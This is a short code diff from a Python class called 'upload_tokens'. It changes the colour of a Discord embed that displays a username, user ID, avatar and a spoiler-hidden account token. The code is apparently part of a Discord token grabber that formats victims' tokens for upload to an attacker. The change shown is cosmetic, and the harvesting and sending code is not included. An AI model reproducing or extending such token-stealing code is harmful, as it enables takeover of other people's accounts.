@@ -339,7 +339,7 @@ class upload_tokens:
             else:
                 codes = None
 
-            embed = Embed(title=f"{username} ({user_id})", color=0x000000)
+            embed = Embed(title=f"{username} ({user_id})", color=0x2f3136)
             embed.set_thumbnail(url=avatar)
 
             embed.add_field(name=":dvd: Token:", value=f"||```{token}```||", inline=False)
